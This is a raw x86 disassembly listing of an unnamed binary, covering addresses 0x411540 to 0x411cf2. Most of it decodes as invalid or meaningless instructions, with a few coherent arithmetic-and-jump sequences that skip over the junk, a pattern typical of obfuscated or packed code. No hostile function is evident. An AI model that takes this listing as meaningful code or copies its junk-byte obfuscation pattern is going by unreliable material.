  411540:	call   0xbcaa:0xf6098f4d
  411547:	xor    DWORD PTR [eax],ebx
  411549:	or     esp,edi
  41154b:	int    0x34
  41154d:	(bad)  
  41154e:	out    dx,eax
  41154f:	xchg   DWORD PTR [edi-0x7f56e6a3],ecx
  411555:	xchg   edx,eax
  411556:	push   es
  411557:	jg     0x411536
  411559:	push   cs
  41155a:	loop   0x411525
  41155c:	iret   
  41155d:	mov    cl,0x47
  41155f:	adc    al,0xa0
  411561:	sbb    DWORD PTR [edx],0x40
  411564:	jmp    0x9ad1:0x7f00
  41156a:	sub    dx,WORD PTR [ecx-0x71a5ab05]
  411571:	scas   eax,DWORD PTR es:[edi]
  411572:	mov    ch,0xf3
  411574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411575:	cld    
  411576:	ins    DWORD PTR es:[edi],dx
  411577:	mov    al,0xeb
  411579:	or     DWORD PTR [edi-0x64],ebx
  41157c:	nop
  41157d:	imul   eax,DWORD PTR [edi+esi*2+0x72],0xc091d705
  411585:	retf   0x838b
  411588:	push   0xfffffff3
  41158a:	imul   ebp,DWORD PTR [edi],0xbdff85f9
  411590:	sti    
  411591:	dec    ecx
  411592:	push   ds
  411593:	pop    ss
  411594:	(bad)  
  411595:	rcl    DWORD PTR [eax-0x12],cl
  411598:	scas   al,BYTE PTR es:[edi]
  411599:	jmp    0x4115a8
  41159b:	cmp    bl,BYTE PTR [edx+0x74]
  41159e:	fs es call 0xd1a8:0x8e903806
  4115a7:	xor    al,0xfc
  4115a9:	aad    0xab
  4115ab:	repz push esp
  4115ad:	outs   dx,BYTE PTR ds:[esi]
  4115ae:	or     ebx,edi
  4115b0:	into   
  4115b1:	jne    0x411541
  4115b3:	push   es
  4115b4:	je     0x41159e
  4115b6:	push   esi
  4115b7:	ret    0x53c8
  4115ba:	inc    ecx
  4115bb:	xlat   BYTE PTR ds:[ebx]
  4115bc:	into   
  4115bd:	add    dl,BYTE PTR [ecx]
  4115bf:	mov    eax,cs
  4115c1:	jmp    0x4115de
  4115c3:	in     al,0xff
  4115c5:	fadd   st,st(3)
  4115c7:	fsubr  DWORD PTR [ebx+edi*8]
  4115ca:	imul   ecx,eax,0x1d
  4115cd:	add    BYTE PTR [esi-0x1b],dh
  4115d0:	pop    ebx
  4115d1:	push   0x2b79d477
  4115d6:	ja     0x411612
  4115d8:	mov    ecx,0xf4f8fedc
  4115dd:	jg     0x4115c0
  4115df:	imul   DWORD PTR fs:[ebx]
  4115e2:	das    
  4115e3:	aaa    
  4115e4:	or     cl,BYTE PTR [eax-0x46]
  4115e7:	test   eax,0x1dc8d1fb
  4115ec:	inc    esi
  4115ed:	or     eax,0x3e4c5994
  4115f2:	fs ins BYTE PTR es:[edi],dx
  4115f4:	adc    ch,BYTE PTR [edx+0x2]
  4115f7:	xchg   ecx,eax
  4115f8:	inc    edi
  4115f9:	sbb    ah,dl
  4115fb:	aad    0x1f
  4115fd:	inc    edi
  4115fe:	adc    ebp,DWORD PTR [esi+edx*1]
  411601:	scas   al,BYTE PTR es:[edi]
  411602:	sbb    al,cl
  411604:	sbb    eax,0x936d63be
  411609:	xchg   edx,edx
  41160b:	(bad)  
  41160c:	jmp    0xc08c0d1a
  411611:	xchg   ecx,eax
  411612:	dec    ebp
  411613:	adc    al,0xc
  411615:	push   esi
  411616:	(bad)  
  411617:	mov    cl,bl
  411619:	inc    esi
  41161a:	xlat   BYTE PTR ds:[ebx]
  41161b:	daa    
  41161c:	sbb    BYTE PTR [edx-0x6c],dl
  41161f:	(bad)  
  411620:	sbb    DWORD PTR [eax-0xde8897],ecx
  411626:	pop    esp
  411627:	aas    
  411628:	push   0xe7dd3183
  41162d:	push   esp
  41162e:	push   esi
  41162f:	or     al,0xca
  411631:	(bad)  
  411632:	idiv   BYTE PTR [ebx+0x49c54555]
  411638:	enter  0xa61b,0x1f
  41163c:	out    0xb4,eax
  41163e:	imul   esi,DWORD PTR [edi],0xa6a6110a
  411644:	daa    
  411645:	push   0x476d8498
  41164a:	shl    edx,cl
  41164c:	xchg   esi,eax
  41164d:	daa    
  41164e:	jno    0x41162b
  411650:	pusha  
  411651:	mov    ebx,DWORD PTR [ebx]
  411653:	shl    BYTE PTR [edx],0xff
  411656:	xchg   edi,eax
  411657:	fdivr  DWORD PTR [ebp-0x1e12d4e2]
  41165d:	(bad)  
  41165e:	pop    esi
  41165f:	stc    
  411660:	xchg   bh,bl
  411662:	es fs (bad) 
  411665:	jecxz  0x411649
  411667:	mov    bh,0x8
  411669:	adc    al,BYTE PTR [esi]
  41166b:	sub    al,0x89
  41166d:	cdq    
  41166e:	sbb    DWORD PTR [eax+0x1ad32311],0x30
  411675:	jne    0x411606
  411677:	dec    eax
  411678:	push   cs
  411679:	call   0x60da:0x45f3c24d
  411680:	out    0x6c,al
  411682:	dec    esi
  411683:	jae    0x4116f8
  411685:	sub    dh,BYTE PTR [edx+edx*1+0xe91a363]
  41168c:	arpl   WORD PTR [ebp+ebx*8-0x26],sp
  411690:	xchg   DWORD PTR [edx+esi*2],eax
  411693:	les    eax,FWORD PTR [ebp-0x20]
  411696:	int    0xa7
  411698:	ffreep st(2)
  41169a:	xchg   ecx,eax
  41169b:	mov    cl,0x55
  41169d:	bts    DWORD PTR fs:[ebx+0x4c],esi
  4116a2:	pop    ss
  4116a3:	not    DWORD PTR [ebx+0x1c8de506]
  4116a9:	mov    bl,BYTE PTR [esi]
  4116ab:	push   eax
  4116ac:	sar    BYTE PTR [edi],1
  4116ae:	dec    eax
  4116af:	mov    eax,0xc66b1e1d
  4116b4:	add    dl,bh
  4116b6:	fild   DWORD PTR [eax+0x54]
  4116b9:	cmp    BYTE PTR ds:0x6d2ff6b1,al
  4116bf:	adc    DWORD PTR [ebx-0x4e],esi
  4116c2:	call   0xfb019959
  4116c7:	scas   eax,DWORD PTR es:[edi]
  4116c8:	popf   
  4116c9:	push   DWORD PTR [esi+ebp*1+0x73]
  4116cd:	add    DWORD PTR [ebx+0x39],ebx
  4116d0:	xchg   DWORD PTR [esi-0x57],eax
  4116d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d4:	sbb    al,0x50
  4116d6:	cld    
  4116d7:	mov    al,ch
  4116d9:	push   ds
  4116da:	sbb    eax,0xe70db0d6
  4116df:	add    ch,BYTE PTR [ebp+0x34]
  4116e2:	(bad)  [ecx+edx*2-0xd]
  4116e6:	cmp    dl,dh
  4116e8:	cld    
  4116e9:	icebp  
  4116ea:	xchg   edx,eax
  4116eb:	cmp    BYTE PTR [bp+di],dh
  4116ee:	sub    al,0xd6
  4116f0:	dec    eax
  4116f1:	cmc    
  4116f2:	(bad)  
  4116f4:	mov    WORD PTR [ecx+0x3d19b8e6],?
  4116fa:	push   0x6a
  4116fc:	add    DWORD PTR [edi+0x25],edx
  4116ff:	arpl   WORD PTR [edx-0x6905e85f],sp
  411705:	xchg   edi,eax
  411706:	cmp    dh,BYTE PTR [edi-0x25]
  411709:	(bad)  
  41170a:	jle    0x4116ae
  41170c:	sbb    eax,0x44aab4c8
  411711:	mov    BYTE PTR [edx],bh
  411713:	jle    0x411705
  411715:	lock ins BYTE PTR es:[edi],dx
  411717:	dec    esp
  411718:	out    0x85,al
  41171a:	push   ss
  41171b:	add    BYTE PTR [ecx-0x48],bh
  41171e:	and    bl,cl
  411720:	jno    0x41170e
  411722:	arpl   WORD PTR [ecx-0x2d],bx
  411725:	jmp    0xb97:0x91891a9a
  41172c:	(bad)  
  41172d:	push   edx
  41172e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172f:	fmul   DWORD PTR [ebx*4-0x4be8f5f6]
  411736:	sub    ebp,DWORD PTR [ebp+0x2a]
  411739:	mov    esi,0xf1bdb6ad
  41173e:	and    BYTE PTR [ebx+0x71],dl
  411741:	out    0x30,eax
  411743:	cld    
  411744:	adc    ebp,DWORD PTR [ecx]
  411746:	jae    0x411720
  411748:	mov    dl,ah
  41174a:	gs pop esi
  41174c:	inc    edi
  41174d:	jl     0x4116d6
  41174f:	inc    edi
  411750:	pop    ds
  411751:	sbb    BYTE PTR [ebp+0x65cdec23],bl
  411757:	adc    DWORD PTR [ebx+0x1f],0x87a20f3
  41175e:	mov    ebx,DWORD PTR [edi]
  411760:	push   edx
  411761:	popa   
  411762:	inc    edx
  411763:	inc    ebx
  411764:	pop    es
  411765:	xchg   edx,eax
  411766:	loope  0x4117d7
  411768:	aam    0xb0
  41176a:	push   ss
  41176b:	stc    
  41176c:	xor    DWORD PTR [edi-0x51],0xffffff8b
  411770:	pushf  
  411771:	gs adc al,0xfc
  411774:	ins    DWORD PTR es:[edi],dx
  411775:	jae    0x411766
  411777:	mov    esp,0xed74a083
  41177c:	stos   DWORD PTR es:[edi],eax
  41177d:	cld    
  41177e:	add    bl,BYTE PTR [edi]
  411780:	push   esi
  411781:	pop    ds
  411782:	mov    ah,dl
  411784:	mov    ebp,0xd0558b43
  411789:	jmp    0x411f76
  41178e:	mov    edx,DWORD PTR [ebp-0x38]
  411791:	mov    edi,DWORD PTR [ebp-0x4]
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	popa   
  4117b4:	push   ds
  4117b5:	(bad)  
  4117b6:	iret   
  4117b7:	and    al,0x62
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	jp     0x41174a
  4117c1:	pop    ss
  4117c2:	jecxz  0x411830
  4117c4:	cmp    cl,BYTE PTR [ebx+0x26d0f0f2]
  4117ca:	gs sti 
  4117cc:	jl     0x411750
  4117ce:	add    eax,0x8b157ba4
  4117d3:	cmp    eax,0x9df5979b
  4117d8:	jle    0x41177e
  4117da:	fldcw  WORD PTR [ebp+0x3b]
  4117dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e0:	cmp    DWORD PTR [ebx],edi
  4117e2:	aam    0xa8
  4117e4:	lahf   
  4117e5:	push   cs
  4117e6:	arpl   WORD PTR [esi+eax*2+0x6a4c7782],sp
  4117ed:	inc    ecx
  4117ee:	mov    dl,0x43
  4117f0:	stc    
  4117f1:	inc    edx
  4117f2:	adc    bl,ah
  4117f4:	mov    bl,0x6
  4117f6:	(bad)  
  4117f7:	ss icebp 
  4117f9:	xor    DWORD PTR [ebp+0x4593278c],ebp
  4117ff:	popa   
  411800:	lds    ecx,FWORD PTR [edx+0x1ae21d0]
  411806:	add    dh,BYTE PTR [edx]
  411808:	and    cl,BYTE PTR [ecx+esi*8-0x74]
  41180c:	sub    BYTE PTR [ecx],dh
  41180e:	xchg   ebx,eax
  41180f:	pop    ebx
  411810:	mov    al,ds:0xf3d1f931
  411815:	setl   BYTE PTR [edi+0x28]
  411819:	mov    edx,DWORD PTR [edi+0x17]
  41181c:	sbb    BYTE PTR [ecx+edi*4],cl
  41181f:	cmc    
  411820:	ins    DWORD PTR es:[edi],dx
  411821:	fisub  DWORD PTR [ebp-0x3fd240e7]
  411827:	add    al,0x3d
  411829:	shr    BYTE PTR [edx],cl
  41182b:	enter  0xf4a9,0x9b
  41182f:	xchg   ebx,eax
  411830:	mov    dl,0xda
  411832:	(bad)  
  411833:	xor    al,0x7b
  411835:	neg    DWORD PTR [esi]
  411837:	fst    st(0)
  411839:	enter  0xf469,0x1a
  41183d:	stos   DWORD PTR es:[edi],eax
  41183e:	sbb    BYTE PTR cs:[ecx-0x74c3c892],0x9a
  411846:	pusha  
  411847:	jg     0x41181b
  411849:	jo     0x411821
  41184b:	and    BYTE PTR [eax],al
  41184d:	push   ds
  41184e:	in     al,dx
  41184f:	fst    st(5)
  411851:	fxch   st(4)
  411853:	and    DWORD PTR [edx+0x54f61ab8],ebx
  411859:	mov    ds,WORD PTR [ebp-0x7e8436fa]
  41185f:	inc    ecx
  411860:	inc    ecx
  411861:	sti    
  411862:	dec    edi
  411863:	inc    edi
  411864:	pop    ss
  411865:	and    al,0x27
  411867:	mov    esp,0x81183984
  41186c:	push   0x24e9e7bc
  411871:	jmp    0x59e7:0xb56204c9
  411878:	loope  0x411889
  41187a:	cmp    dl,BYTE PTR [eax]
  41187c:	clc    
  41187d:	std    
  41187e:	inc    edi
  41187f:	and    ebp,esi
  411881:	xor    DWORD PTR [ebp+0x0],edx
  411884:	or     eax,0xaa1a3bf6
  411889:	int3   
  41188a:	xchg   edx,eax
  41188c:	jo     0x411881
  41188e:	adc    ch,BYTE PTR [ecx-0x61]
  411891:	fistp  WORD PTR [edx+0x4331ea8c]
  411897:	into   
  411898:	inc    ebp
  411899:	test   al,0xc
  41189b:	test   dl,bh
  41189d:	aas    
  41189e:	int    0x9c
  4118a0:	lds    edi,FWORD PTR [ebp+0x29]
  4118a3:	out    0x20,al
  4118a5:	and    dh,BYTE PTR [ebx]
  4118a7:	unpckhps xmm2,XMMWORD PTR [ebx+0x6a]
  4118ab:	mov    ch,bl
  4118ad:	pop    ebp
  4118ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118af:	div    esp
  4118b1:	or     ecx,DWORD PTR [eax-0x4b9babfd]
  4118b7:	aad    0xfc
  4118b9:	mov    al,ds:0x1c3790e6
  4118be:	je     0x4118b7
  4118c0:	push   cs
  4118c1:	je     0x41186b
  4118c3:	loop   0x4118b7
  4118c5:	add    dl,BYTE PTR [edi+eiz*8+0x47]
  4118c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118ca:	enter  0x7073,0x7
  4118ce:	jecxz  0x4118bc
  4118d0:	arpl   WORD PTR [eax-0x508c6bbb],si
  4118d6:	sub    esi,edx
  4118d8:	push   0x49007e7e
  4118dd:	(bad)  
  4118de:	mov    cl,0x6a
  4118e0:	push   0xffffffe0
  4118e2:	test   al,0x34
  4118e4:	add    ah,BYTE PTR [esi-0x7f]
  4118e7:	pop    edx
  4118e8:	dec    esi
  4118e9:	ret    0xa866
  4118ec:	sti    
  4118ed:	or     eax,ecx
  4118ef:	fcmovb st,st(5)
  4118f1:	or     dl,0x87
  4118f4:	pusha  
  4118f5:	add    al,0x9
  4118f7:	sbb    esp,edi
  4118f9:	inc    ecx
  4118fb:	xor    DWORD PTR [edx+0x2a41d4b9],ecx
  411901:	dec    esp
  411902:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  411904:	and    eax,0x3f0927b5
  411909:	mov    ds:0xef5e0a0c,al
  41190e:	add    ah,al
  411910:	sbb    ebp,DWORD PTR [edx-0x5f]
  411913:	loope  0x411934
  411915:	retf   0xbb5d
  411918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411919:	pop    ds
  41191a:	jecxz  0x41190e
  41191c:	hlt    
  41191d:	addr16 inc edx
  41191f:	icebp  
  411920:	xchg   esp,eax
  411921:	pop    ebx
  411922:	imul   eax,DWORD PTR [ebp+0x26e54860],0xffffffaf
  411929:	and    ecx,esi
  41192b:	div    DWORD PTR [ecx]
  41192d:	lds    ebx,FWORD PTR [edi+0x48637011]
  411933:	mov    bh,0x89
  411935:	cmp    eax,0xa8c60745
  41193a:	sar    BYTE PTR [ebx+0x1b],cl
  41193d:	call   FWORD PTR [edx]
  41193f:	arpl   cx,bp
  411941:	lods   al,BYTE PTR ds:[esi]
  411942:	push   esi
  411943:	jg     0x4118d7
  411945:	add    bh,BYTE PTR [ebp-0x4]
  411948:	xor    BYTE PTR es:[edx+ebx*1-0x2b],al
  41194d:	out    0x40,eax
  41194f:	bnd ja 0x411962
  411952:	push   ecx
  411953:	test   eax,0x5d7693fb
  411958:	xor    DWORD PTR [edi+0x1f],0xbbd92b67
  41195f:	cs or  al,0xd2
  411962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411963:	(bad)  
  411964:	jle    0x4119b2
  411966:	outs   dx,DWORD PTR ds:[esi]
  411967:	sbb    eax,0x31a44819
  41196c:	call   0x4dee6266
  411971:	inc    ebx
  411972:	or     eax,DWORD PTR [ebp-0x71]
  411975:	sti    
  411976:	sub    eax,0xb1bfb5b0
  41197b:	enter  0xce43,0xab
  41197f:	mov    cs,WORD PTR [ecx]
  411981:	jbe    0x4119b0
  411983:	xchg   DWORD PTR [esi-0x34],ebp
  411986:	lods   al,BYTE PTR ds:[esi]
  411987:	xchg   esp,eax
  411988:	adc    eax,DWORD PTR [esi-0x26416893]
  41198e:	imul   ecx,ecx,0x4cd19464
  411994:	and    BYTE PTR [eax-0x71],bh
  411997:	shl    DWORD PTR [esi],1
  411999:	fist   DWORD PTR [eax+0xd]
  41199c:	bound  ecx,QWORD PTR [ebx-0x5b3846c4]
  4119a2:	(bad)  
  4119a3:	push   ebp
  4119a4:	inc    ecx
  4119a5:	loopne 0x4119af
  4119a7:	clc    
  4119a8:	adc    al,BYTE PTR [edx+eiz*4-0x38]
  4119ac:	imul   ax,WORD PTR [edi+0x1f],0x97dc
  4119b2:	mov    dl,0x78
  4119b4:	push   esi
  4119b5:	stos   BYTE PTR es:[edi],al
  4119b6:	das    
  4119b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119b8:	into   
  4119b9:	xchg   ebx,eax
  4119ba:	cld    
  4119bb:	popf   
  4119bc:	add    ch,cl
  4119be:	and    edi,DWORD PTR [eax]
  4119c0:	daa    
  4119c1:	cdq    
  4119c2:	inc    ebp
  4119c3:	retf   0x7733
  4119c6:	inc    ebx
  4119c7:	dec    ecx
  4119c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119c9:	and    BYTE PTR [ecx+0x58d65294],0xad
  4119d0:	xchg   DWORD PTR ds:0x9f954e8e,edx
  4119d6:	mov    ds:0xb58e8f53,al
  4119db:	or     DWORD PTR [edx],ebx
  4119dd:	jmp    0x50d2:0x691bb365
  4119e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e5:	pop    ecx
  4119e6:	ds test al,0x93
  4119e9:	icebp  
  4119ea:	adc    eax,0xc816b7d8
  4119ef:	adc    eax,0x6df522c5
  4119f4:	pushf  
  4119f5:	lds    esi,FWORD PTR [ebx+0x456acebe]
  4119fb:	dec    edi
  4119fc:	loope  0x411a77
  4119fe:	mov    DWORD PTR [ecx],0xe6f6b430
  411a04:	in     eax,0x40
  411a06:	out    dx,al
  411a07:	data16 cld 
  411a09:	mov    al,ds:0x85ccab0
  411a0e:	repnz sahf 
  411a10:	jg     0x4119e6
  411a12:	mov    dl,0x42
  411a14:	stc    
  411a15:	in     al,dx
  411a16:	(bad)  [ebx]
  411a18:	cmp    DWORD PTR [edx+eiz*4+0x37],edx
  411a1c:	in     al,0x7a
  411a1e:	stos   DWORD PTR es:[edi],eax
  411a1f:	test   al,0x21
  411a21:	test   al,0x82
  411a23:	inc    ecx
  411a24:	jne    0x4119fc
  411a26:	sub    BYTE PTR [ecx],cl
  411a28:	xchg   esi,ebx
  411a2a:	mov    ebx,DWORD PTR [ebp-0x10]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0xe7d7da8b
  411a62:	js     0x411a33
  411a64:	and    eax,0x78786091
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	cmp    ebx,DWORD PTR [ebp-0x5f]
  411a70:	jecxz  0x411a77
  411a72:	pushw  0x4d67
  411a76:	dec    ebp
  411a77:	or     BYTE PTR [ecx-0x28],dh
  411a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a7b:	push   0x4578a56
  411a80:	dec    esi
  411a81:	pop    ds
  411a82:	scas   eax,DWORD PTR es:[edi]
  411a83:	mov    ebp,0xa78a6268
  411a88:	in     al,dx
  411a89:	push   ecx
  411a8a:	je     0x411ad7
  411a8c:	mov    bl,0xd5
  411a8e:	(bad)  
  411a8f:	fistp  WORD PTR [ebx+eiz*8-0xfeb6f24]
  411a96:	pusha  
  411a97:	xor    ch,BYTE PTR [esi]
  411a99:	pop    ebp
  411a9a:	aad    0x8d
  411a9c:	xchg   esp,eax
  411a9d:	iret   
  411a9e:	mov    al,0x6
  411aa0:	or     esi,DWORD PTR [edi]
  411aa2:	fnsave [eax+0xa7ebefa]
  411aa8:	pop    eax
  411aa9:	sbb    eax,0x119088b6
  411aae:	dec    esi
  411aaf:	int3   
  411ab0:	xor    eax,0x16e03f96
  411ab5:	mov    ds:0xe8c44d95,eax
  411aba:	pop    ecx
  411abb:	mov    al,ds:0x756c59d4
  411ac0:	retf   
  411ac1:	adc    ebp,DWORD PTR [edx+ebp*1]
  411ac4:	adc    al,0xaa
  411ac6:	cmp    al,0xcf
  411ac8:	jl     0x411a4b
  411aca:	xchg   esp,eax
  411acb:	push   ss
  411acc:	dec    ecx
  411acd:	dec    BYTE PTR [edi-0x56eb6a19]
  411ad3:	inc    ebx
  411ad4:	mov    gs:0x4ca4a310,al
  411ada:	aad    0x3e
  411adc:	jecxz  0x411b26
  411ade:	pop    es
  411adf:	(bad)
  411ae4:	push   esi
  411ae5:	mov    edx,0x19139da6
  411aea:	sti    
  411aeb:	pop    edx
  411aec:	xchg   ebx,eax
  411aed:	inc    ecx
  411aee:	sub    al,0xe9
  411af0:	xchg   ebx,eax
  411af1:	xor    bl,BYTE PTR [edx+ebp*8]
  411af4:	(bad)  
  411af6:	into   
  411af7:	fwait
  411af8:	es cmp eax,0xedabd7
  411afe:	das    
  411aff:	mov    esp,0x6aa5943a
  411b04:	shl    DWORD PTR ds:0xf6631465,1
  411b0a:	jno    0x411b05
  411b0c:	fwait
  411b0d:	ror    DWORD PTR [ecx],0x91
  411b10:	fsubr  QWORD PTR [ecx+0x3853a8a6]
  411b16:	call   FWORD PTR [eax+eax*1]
  411b19:	stos   DWORD PTR es:[edi],eax
  411b1a:	mov    ebx,0x91e136fe
  411b1f:	adc    DWORD PTR [eax],edx
  411b21:	mov    bh,0xc
  411b23:	int3   
  411b24:	or     eax,0xa24bea70
  411b29:	(bad)  
  411b2a:	jne    0x411b34
  411b2c:	sbb    DWORD PTR [ecx-0x3b],ebx
  411b2f:	fst    QWORD PTR [edx]
  411b31:	retf   0x7c1
  411b34:	fs jnp 0x411aba
  411b37:	xor    ecx,esp
  411b39:	sbb    BYTE PTR [edi+0x4953c24f],dh
  411b3f:	call   0x5a03:0x413b6f2d
  411b46:	cli    
  411b47:	mov    dl,0xbb
  411b49:	test   eax,0xa0b8dcf5
  411b4e:	jmp    0x411b6d
  411b50:	inc    ecx
  411b51:	sub    ch,0x1
  411b54:	or     DWORD PTR [ebp+0x30ac3c47],0x65
  411b5b:	leave  
  411b5c:	pushf  
  411b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b5e:	aad    0x70
  411b60:	sbb    bl,ah
  411b62:	inc    ebp
  411b63:	cmp    dl,BYTE PTR [esi-0x7a]
  411b66:	pop    esi
  411b67:	loope  0x411ba0
  411b69:	mov    cl,0x2b
  411b6b:	and    ebp,DWORD PTR fs:[edi]
  411b6e:	xchg   edi,eax
  411b6f:	xor    eax,0x4c248ba8
  411b74:	rcr    DWORD PTR [edi-0x7f],1
  411b77:	jns    0x411b60
  411b79:	shl    BYTE PTR [ebp+eax*2-0x1e],cl
  411b7d:	shr    cl,0x95
  411b80:	xchg   ecx,eax
  411b81:	out    0x9c,al
  411b83:	cmp    eax,0x338964fb
  411b88:	push   0xd51e0c04
  411b8d:	sbb    DWORD PTR [edi-0x5c178763],esi
  411b93:	push   0xfffffff7
  411b95:	pop    edx
  411b96:	fcomip st,st(5)
  411b98:	cmp    ebx,DWORD PTR [ecx-0x67]
  411b9b:	clc    
  411b9c:	xchg   edi,eax
  411b9d:	int    0x25
  411b9f:	and    edi,eax
  411ba1:	out    dx,al
  411ba2:	xchg   ebx,eax
  411ba3:	jb     0x411b35
  411ba5:	int3   
  411ba6:	mov    ebp,0x6e1c832d
  411bab:	mov    al,ds:0x4fde4f65
  411bb0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bb2:	nop
  411bb3:	or     al,0x45
  411bb5:	inc    edx
  411bb6:	mov    al,0x96
  411bb8:	xchg   esp,ebx
  411bba:	dec    edx
  411bbb:	in     eax,dx
  411bbc:	xchg   ecx,eax
  411bbd:	data16 das 
  411bbf:	ins    DWORD PTR es:[edi],dx
  411bc0:	es popf 
  411bc2:	and    al,BYTE PTR [ecx+0x39e03d1]
  411bc8:	lods   eax,DWORD PTR ds:[esi]
  411bc9:	inc    eax
  411bca:	std    
  411bcb:	dec    esi
  411bcc:	sub    bh,BYTE PTR [edi+0x6eb89af7]
  411bd2:	cmp    ebx,DWORD PTR [eax+0x40658846]
  411bd8:	jmp    0x411bf1
  411bda:	fwait
  411bdb:	call   0x6ab6d8c8
  411be0:	push   ebx
  411be1:	popa   
  411be2:	or     eax,0xcfdb2482
  411be7:	or     al,0x8d
  411be9:	(bad)  
  411bea:	xlat   BYTE PTR ds:[ebx]
  411beb:	mov    edi,0xb735a814
  411bf0:	sub    al,0x32
  411bf2:	xor    dl,ch
  411bf4:	adc    ebx,edi
  411bf6:	(bad)  
  411bf7:	in     eax,dx
  411bf8:	in     al,0x2
  411bfa:	dec    ebp
  411bfb:	lahf   
  411bfc:	adc    esp,DWORD PTR [edx-0x7]
  411bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c00:	jmp    0xa081:0x75bd1100
  411c07:	xchg   bp,ax
  411c09:	sar    DWORD PTR [edi+0x9902be7],0x6d
  411c10:	stc    
  411c11:	in     al,dx
  411c12:	pop    ss
  411c13:	and    BYTE PTR [edi],al
  411c15:	out    0xec,ax
  411c18:	adc    al,0x49
  411c1a:	fs pop edx
  411c1c:	or     cl,BYTE PTR [esi+0x35e31bd]
  411c22:	call   0x271a:0xc4312ebc
  411c29:	aaa    
  411c2a:	inc    edi
  411c2b:	inc    eax
  411c2c:	outs   dx,BYTE PTR ds:[esi]
  411c2d:	popa   
  411c2e:	scas   al,BYTE PTR es:[edi]
  411c2f:	es jmp 0xcb2ce305
  411c35:	cs push esp
  411c37:	xchg   esp,eax
  411c38:	out    0x5b,eax
  411c3a:	and    al,0x69
  411c3c:	mov    cl,BYTE PTR [esi-0x6c]
  411c3f:	aad    0x72
  411c41:	push   es
  411c42:	pop    esi
  411c43:	mov    dh,0x4c
  411c45:	xlat   BYTE PTR ds:[ebx]
  411c46:	push   0x6e
  411c48:	adc    al,0xa6
  411c4a:	cmp    ebp,edi
  411c4c:	dec    ebp
  411c4d:	sti    
  411c4e:	lea    esi,[edx-0x4f7dcda3]
  411c54:	loope  0x411c18
  411c56:	push   cs
  411c57:	cmc    
  411c58:	add    DWORD PTR [edx],0xae49514d
  411c5e:	out    dx,al
  411c5f:	jp     0x411c4c
  411c61:	jbe    0x411c11
  411c63:	scas   al,BYTE PTR es:[edi]
  411c64:	data16 mov ch,0x25
  411c67:	mov    ah,BYTE PTR [edi-0x1af0b51a]
  411c6d:	sub    dh,BYTE PTR [ebp-0x6d]
  411c70:	pop    ebx
  411c71:	cmp    al,0x1e
  411c73:	(bad)  
  411c75:	pop    ss
  411c76:	inc    ebp
  411c77:	js     0x411c28
  411c79:	ret    0x3e5e
  411c7c:	out    0x38,eax
  411c7e:	pop    es
  411c7f:	enter  0x6645,0x4b
  411c83:	lea    esp,[ecx+0x66]
  411c86:	mov    BYTE PTR [ecx+0x8],bl
  411c89:	add    al,0x61
  411c8b:	xor    DWORD PTR [edx-0x49],eax
  411c8e:	push   ds
  411c8f:	es jmp 0x719d:0xbbee0b9e
  411c97:	xchg   ecx,eax
  411c98:	pop    ss
  411c99:	jmp    0xb1c2ae7
  411c9e:	adc    esp,ebp
  411ca0:	ins    DWORD PTR es:[edi],dx
  411ca1:	pop    ds
  411ca2:	push   edi
  411ca3:	test   eax,0xd54d8ead
  411ca8:	mov    ecx,0xeb9f510b
  411cad:	test   al,0x31
  411caf:	jmp    0x3b00:0xf3eadfc7
  411cb6:	add    BYTE PTR [esi-0x71d43c3b],bl
  411cbc:	(bad)  
  411cbd:	sidtd  [ebp+0x78]
  411cc1:	(bad)  
  411cc3:	(bad)  
  411cc5:	icebp  
  411cc6:	or     eax,0x37ec4007
  411ccb:	dec    esp
  411ccc:	sti    
  411ccd:	test   al,0x94
  411ccf:	jle    0x411d46
  411cd1:	mul    DWORD PTR [bp+si-0x43]
  411cd5:	cmp    DWORD PTR [ebp-0x7827487],ebx
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
